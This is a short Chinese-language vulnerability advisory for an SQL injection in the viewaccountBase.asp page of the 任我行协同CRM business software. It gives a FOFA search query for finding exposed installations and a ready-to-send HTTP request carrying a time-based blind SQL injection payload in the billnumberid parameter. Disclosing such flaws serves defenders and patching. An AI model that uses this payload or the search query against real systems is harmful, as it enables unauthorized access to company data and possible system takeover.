# 任我行协同CRM普及版viewaccountBase存在SQL注入漏洞

# 一、漏洞简介
任我行CRM是CRM（客户关系管理）、OA（自动化办公）、OM（目标管理）、KM（知识管理）、HR（人力资源）一体化的企业管理软件。通过建立组织运营管理铁三角（目标行动-企业文化-知识复制），一切围绕以客户为中心的全方位、透明化业务管理（市场-销售-生产-服务），打造企业组织高效协同的运营管理平台。任我行协同CRM存在SQL注入漏洞，远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限。

# 二、影响版本
+ 任我行协同CRM

# 三、资产测绘
```
fofa:app="任我行软件-管家婆分销ERP"
```

# 四、漏洞复现
```plain
GET /common/viewaccountBase.asp?TimeCheckPoint=80685.73&billnumberid=-1%20waitfor%20delay%20%270:0:8%27--&billtype= HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
```
